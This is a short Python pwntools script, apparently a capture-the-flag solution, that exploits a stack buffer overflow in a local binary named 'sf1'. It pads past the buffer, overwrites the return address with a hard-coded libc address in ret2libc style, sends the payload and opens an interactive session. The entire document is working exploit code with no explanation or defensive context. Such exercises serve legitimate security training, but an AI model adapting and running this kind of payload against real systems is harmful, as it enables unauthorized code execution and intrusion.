from pwn import*
p = process('./sf1')

pay = ''
pay += 'a'*0x88
pay += 'b'*0x4
pay += p32(0xf7e61ca0)
pay += 'c'*0x4
pay += 'd'*0x4
raw_input()
p.send(pay)


p.interactive()
